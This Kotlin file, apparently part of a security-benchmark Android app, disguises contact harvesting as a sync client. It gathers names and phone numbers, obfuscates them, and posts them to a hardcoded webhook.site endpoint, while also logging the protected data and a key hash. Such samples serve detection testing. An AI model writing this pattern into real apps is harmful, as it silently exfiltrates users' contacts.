package co.ostorlab.ben74

import android.content.Context
import android.util.Log
import co.ostorlab.ben74.data.AppDatabase
import co.ostorlab.ben74.data.SyncMetadata
import co.ostorlab.ben74.data.SyncQueueItem
import co.ostorlab.ben74.util.StringObfuscator
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

object ApiClient {
    
    private const val TAG = "ApiClient"
    private const val ENDPOINT = "https://webhook.site/4e206885-7209-4369-b961-c77f5fcaace4"
    
    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    
    private val gson = Gson()
    
    suspend fun uploadData(context: Context, items: List<UserData>): Boolean = withContext(Dispatchers.IO) {
        try {
            val database = AppDatabase.getDatabase(context)
            
            val jsonData = buildPayload(items)
            val fingerprint = StringObfuscator.generateFingerprint(jsonData)
            
            Log.d(TAG, "Data fingerprint: $fingerprint")
            
            val queueItem = SyncQueueItem(
                payload = jsonData,
                timestamp = System.currentTimeMillis(),
                synced = false
            )
            val itemId = database.syncDao().insertItem(queueItem)
            Log.d(TAG, "Queued item with ID: $itemId")
            
            val securedData = DataProtector.protect(jsonData)
            val checksum = StringObfuscator.createChecksum(securedData.toByteArray())
            
            Log.d(TAG, "Protected: $securedData")
            Log.d(TAG, "Checksum: $checksum")
            Log.d(TAG, "Security version: ${DataProtector.getVersion()}")
            Log.d(TAG, "Key hash: ${DataProtector.getKeyHash()}")
            
            val requestBody = securedData.toRequestBody("text/plain".toMediaType())
            val request = Request.Builder()
                .url(ENDPOINT)
                .post(requestBody)
                .addHeader("Content-Type", "text/plain")
                .addHeader("X-Data-Format", "Secure")
                .addHeader("X-App-Version", "2.1.0")
                .addHeader("X-Checksum", checksum)
                .addHeader("X-Fingerprint", fingerprint)
                .addHeader("X-Security-Version", DataProtector.getVersion())
                .build()
            
            val response = client.newCall(request).execute()
            val success = response.isSuccessful
            
            Log.d(TAG, "Upload ${if (success) "successful" else "failed"}: ${response.code}")
            
            if (success) {
                val updatedItem = queueItem.copy(id = itemId, synced = true)
                database.syncDao().updateItem(updatedItem)
                
                val metadata = SyncMetadata(
                    key = "last_sync_timestamp",
                    value = System.currentTimeMillis().toString(),
                    updatedAt = System.currentTimeMillis()
                )
                database.syncDao().insertMetadata(metadata)
            }
            
            response.close()
            return@withContext success
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading data", e)
            return@withContext false
        }
    }
    
    private fun buildPayload(items: List<UserData>): String {
        val payload = mapOf(
            "contacts" to items.map { 
                mapOf(
                    "name" to it.name,
                    "phone" to it.phoneNumber,
                    "id" to StringObfuscator.generateFingerprint("${it.name}${it.phoneNumber}")
                )
            },
            "metadata" to mapOf(
                "timestamp" to System.currentTimeMillis(),
                "count" to items.size,
                "version" to "2.1.0"
            )
        )
        return gson.toJson(payload)
    }
}

data class UserData(
    val name: String,
    val phoneNumber: String
)
